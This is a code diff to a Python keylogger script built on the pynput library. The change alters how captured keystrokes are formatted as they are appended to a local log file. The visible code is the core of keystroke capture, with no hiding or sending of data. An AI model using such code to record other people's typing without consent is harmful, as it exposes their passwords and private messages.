@@ -1,4 +1,5 @@
 from pynput.keyboard import Listener
+from datetime import datetime as dt
 
 
 def convert_key(key) -> str:
@@ -13,7 +14,12 @@ def save_time(file: str, name, extra_endline=False) -> None:
 def on_press(key) -> None:
     key = convert_key(key)
     with open('Logger/LOG.txt', 'a') as file:
-        file.write('\n' if key == 'space' else key)
+        if len(key) == 1:
+            file.write(key)
+        elif len(key) > 1 and key != 'space':
+            file.write('\n' + key + '\n')
+        else:
+            file.write('\n')
 
 
 def on_release(key) -> bool | None:
